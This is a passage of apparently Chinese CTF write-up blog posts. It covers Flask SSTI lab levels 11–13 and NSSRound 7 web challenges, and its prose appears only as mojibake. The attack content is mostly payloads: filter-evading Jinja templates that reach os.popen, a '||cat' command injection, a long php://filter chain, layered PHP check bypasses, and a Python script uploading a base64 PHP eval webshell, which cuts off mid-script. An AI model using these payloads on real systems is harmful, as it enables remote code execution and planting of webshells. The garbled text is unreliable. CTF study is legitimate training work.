underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058439.png" alt="image-20230328105827313"></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†ä¸‹åˆ’çº¿<code>_</code>,ç‚¹<code>.</code>,æ•°å­—<code>0-9</code>,åæ–œæ <code>\</code>,å•å¼•å·<code>&#39;</code>,åŒå¼•å·<code>&quot;</code>,æ–¹æ‹¬å·<code>[]</code><br>å°±æ‹¿ä¸Šé¢˜çš„payloadï¼Œåªä¸è¿‡éœ€è¦åŠ ä¸Š9å’Œ18çš„æ„é€ ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªæ•°å­—è¢«è¿‡æ»¤æ— æ³•ç›´æ¥ä½¿ç”¨ä¸‹æ ‡<br>å­—ç¬¦ä¸²åˆ—è¡¨è·å–å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å†å¼„äº†<br>æ€è·¯å°±æ˜¯åˆ©ç”¨å‡½æ•°indexæ¥è·å–ç´¢å¼•ä½ç½®çš„æ•°å­—ï¼Œç„¶ååˆ©ç”¨æ•°å­—ç›¸ä¹˜å¾—åˆ°9å’Œ18ï¼Œè¿™é‡Œä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†ï¼Œä¸ç„¶å¯ä»¥ç›´æ¥å¾—åˆ°18<br>å…ˆæ„é€ indexå‡½æ•°<br><code>&#123;% set index=dict(index=a)|join %&#125;</code><br>ç„¶åè·å–2å’Œ3ï¼Œé€šè¿‡<code>2*3*3</code>å’Œ<code>3*3</code>å¾—åˆ°9å’Œ18</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set u=dict(u=a)|join %&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join %&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n) %&#125;</span><br></pre></td></tr></table></figure><p>åŠ ä¸Š11å…³çš„payloadï¼Œå°†æ•°å­—æ›¿æ¢å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set index=dict(index=a)|join%&#125;</span><br><span class="line">&#123;% set u=dict(u=a)|join%&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u)%&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n)%&#125;</span><br><span class="line">&#123;% set g=dict(get=a)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=a)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=a)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(two*three*three)%&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=a)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=a)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=a)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(three*three)%&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058125.png" alt="image-20230328105842324"></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†<code>_</code>,ç‚¹<code>.</code>,åæ–œæ <code>\</code>,å•å¼•å·<code>&#39;</code>,åŒå¼•å·<code>&quot;</code>,æ–¹æ‹¬å·<code>[]</code>,åŠ å·<code>+</code>,ä»¥åŠä¸€äº›å…³é”®å­—<br><code>&#39;class&#39;</code>, <code>&#39;init&#39;</code>, <code>&#39;arg&#39;</code>, <code>&#39;config&#39;</code>, <code>&#39;app&#39;</code>, <code>&#39;self&#39;</code><br>ä½†æ˜¯11å…³çš„payloadåˆšåˆšå¥½é¿å¼€äº†ï¼Œæ‰€ä»¥ç›´æ¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058257.png" alt="image-20230328105854397"></p><p>å‚è€ƒï¼š<br><a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/#toc-head-12">SSTI-Labsé¶åœº - o2takuXX ã® blogo2takuXX ã® blog</a><br><a href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LABæ”»ç•¥ â€“ JohnFrodâ€™s Blog</a><br><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰_sstiç»•è¿‡_yu22xçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">SSTIè¿›é˜¶ | æ²‰é“æ±¤çš„ç ´ç«™ (chenlvtang.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 7 Teamå¤ç°</title>
      <link href="/undefined/55851.html"/>
      <url>/undefined/55851.html</url>
      
        <content type="html"><![CDATA[<h1 id="ec-RCE"><a href="#ec-RCE" class="headerlink" title="ec_RCE"></a>ec_RCE</h1><p>ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„é¢˜ï¼Œä½†æ˜¯éœ€è¦çœ‹æ‡‚ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By æ¢å§¬ --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ä¸ªæ¯”è¾ƒå¤æ‚çš„javaé¢˜ï¼Œä¸€è¡€ä¹Ÿæ²¡æœ‰äº†å°±ç›´æ¥è·³äº†ï¼Œä¸‹é¢çš„shell_execåé¢æ˜¯æ‰§è¡Œjaræ–‡ä»¶ï¼Œactionå’Œdataå¯æ§ç›´æ¥åˆ©ç”¨<code>||</code>æ‹¼æ¥ä¸€æ¡catå‘½ä»¤å³å¯</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262153808.png" alt="image-20230226215332433"></p><h1 id="0o0"><a href="#0o0" class="headerlink" title="0o0"></a>0o0</h1><p>ç›´æ¥F12å¯ä»¥çœ‹åˆ°ä¸€ä¸ªgetå‚æ•°ï¼Œå½“ç„¶æŠ“åŒ…ä¹Ÿè¡Œ</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156758.png" alt="image-20230226215602606"></p><p>ç„¶åä¼ å‚å‘ç°ä¸‹é¢æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;get:S0uRc3&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;Round7/&#x27;</span>);  </span><br><span class="line"><span class="comment">// include: Nss  </span></span><br><span class="line"><span class="comment">// include: level2  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>])) &#123;    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>],<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Round7&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NO!!!!!   Permission denied!&#x27;</span>);   </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Xy1on&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">        <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Nothing!!!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;S0uRc3&#x27;</span>]))&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;CTF&#x27;</span>,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nothing here&quot;</span>;  </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨0çš„ä½ç½®ä¸Šéœ€è¦åŒ¹é…åˆ°Xy1onï¼Œåˆ©ç”¨å·¥å…·åˆ¶ä½œfilteré“¾ç»•è¿‡ï¼Œ<a href="https://github.com/synacktiv/php_filter_chain_generator">å·¥å…·åœ°å€</a>è¿™é‡Œéœ€è¦æ³¨æ„åœ¨Linuxä¸‹è¿è¡Œå¹¶ä¸”Xy1onåé¢è¦æœ‰ä¸ªç©ºæ ¼ï¼Œå¦åˆ™ä¼šå‡ºç°ä¹±ç ï¼Œåœ¨Windowsä¸‹åŠ ç©ºæ ¼å°±ä¼šæŠ¥é”™ï¼Œè®¿é—®level2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=level2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156261.png" alt="image-20230226215633307"></p><p>è¿›å…¥Ns_SCtF.phpæ‹¿åˆ°æºç ï¼Œè¿™é‡Œå…¶å®ä¸€å¼€å§‹æ‰«ç›®å½•çš„è¯ä¼šæ‰«åˆ°ä¸€ä¸ªDS_Storeï¼Œè¿›å»ä¼šå‘ç°èƒ½ç›´æ¥çœ‹åˆ°Ns_SCtF.phpåªæ˜¯éœ€è¦åˆ æ‰ç©ºæ ¼ï¼Œè¿™æ ·å°±çœç•¥äº†ä¸Šé¢çš„æ­¥éª¤ï¼Œç›´æ¥æ¥åˆ°æœ€åä¸€æ­¥ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157980.png" alt="image-20230226215717918"></p><p>ç„¶åå†çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç»•è¿‡ç›´æ¥çœ‹wpè§£é‡Šï¼ŒæŒºè¯¦ç»†çš„æ‡’å¾—å†™äº†<br><code>é¦–å…ˆæ˜¯å„è‡ªç»•è¿‡ï¼Œç¬¬ä¸€å±‚æ•°ç»„ç»•è¿‡ï¼ŒNSSCTF[]=1&amp;NSSCTF[]=2ï¼Œç¬¬äºŒå±‚æ˜¯in_array()ç¬¬ä¸‰ä¸ªå‚æ•°æ²¡æœ‰ç›´æ¥strictå¯¼è‡´å¯ä»¥ç»•è¿‡ï¼ŒNsScTF=1qï¼Œç¬¬ä¸‰å±‚æ˜¯ä¼ªåè®®NsScTf=data://text/plain,Welcome to Round7!!!ï¼Œç¬¬å››å±‚nss_ctfer.vipæ³¨æ„å˜ä¸ºnss[ctfer.vip(å› ä¸ºPHPåŒ¹é…çš„æ—¶å€™ä¼šè‡ªåŠ¨å°†[.å˜æˆä¸‹åˆ’çº¿ï¼Œæœ‰ä¸”ä»…å˜ä¸€æ¬¡)ï¼Œç¬¬äº”å±‚æ˜¯intval()ç»•è¿‡ï¼Œå­—ç¬¦ä¸²ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¼šé»˜è®¤æ˜¯å‰é¢çš„æ•°å­—ï¼Œæ¯”å¦‚â€™1e1â€™è½¬åŒ–å˜æˆ1ï¼ŒNSScTf=114514e1ï¼Œç¬¬äº”å±‚ç›´æ¥nSScTF=1ï¼Œ$nSscTF=NSSRound7ã€‚è¿™é‡Œçš„å…³é”®æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œé€šè¿‡strops()æ£€æµ‹æ–‡ä»¶çš„åç§°æ˜¯å¦å­˜åœ¨pngï¼Œç›´æ¥æ”¹å¢åŠ pngå³å¯ç»•è¿‡ï¼Œå…³é”®æ˜¯ä¼šå°†&lt;?php die(â€œRound7 do you likeâ€);å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å°±å¯¼è‡´äº†ä¼ å…¥çš„è™½ç„¶æ˜¯phpæ–‡ä»¶ï¼Œä½†æ˜¯ä¼šç»ˆæ­¢ã€‚è¿™é‡Œä¹Ÿæ˜¯ä½¿ç”¨ä¸Šé¢åŒä¸€ä¸ªtipsï¼Œä½¿ç”¨è¿‡æ»¤å™¨ä½¿ç”¨æ–‡ä»¶ï¼Œå¦‚php://filter/write=convert.base64-decode/resource=aiwin.png.phpï¼Œè®©å†™å…¥å†…å®¹è¿›è¡Œbase64è§£ç ï¼Œè¿™é‡Œè¦ä½¿ç”¨URLç¼–ç ï¼Œç»•è¿‡/resource=aiwin.png.phpä½œä¸ºæ–‡ä»¶åï¼Œç„¶ååœ¨æ–‡ä»¶å†™å…¥çš„å†…å®¹ä¸­æ„é€ base64ï¼Œä½¿å¾—&lt;?php die(â€œRound7 do you likeâ€);è¢«ä¸æ­£å¸¸è§£ç ï¼Œé€ æˆæ­»äº¡ç»•è¿‡</code><br>æ­»äº¡ç»•è¿‡ä¹Ÿæ˜¯å¸¸è§çš„ï¼Œä¸»è¦æ˜¯urlç¼–ç ï¼Œä¸ç„¶å°±ä¼šé€ æˆresource&#x3D;aiwin.png.phpä½œä¸ºæ–‡ä»¶åï¼Œç„¶åå°±å¯ä»¥è‡ªå·±åœ¨æœ¬åœ°å†™ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„HTMLæ¥æŠ“åŒ…å¾—åˆ°æ–‡ä»¶ç±»å‹ï¼Œæˆ–è€…ç›´æ¥ç”¨å†™è„šæœ¬æ¥ä¸Šä¼ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">content = <span class="string">b&quot;&quot;&quot;aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pOz8+&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28571/Ns_SCtF.php?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTF=1a&amp;NsScTf=data://text/plain,Welcome%20to%20Round7!!!&amp;nss[ctfer.vip=&amp;NSScTf=114514.3&amp;nSScTF=1&amp;nSscTF=NSSRound7&quot;</span></span><br><span class="line"> </span><br><span class="line">data = &#123;<span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">files = 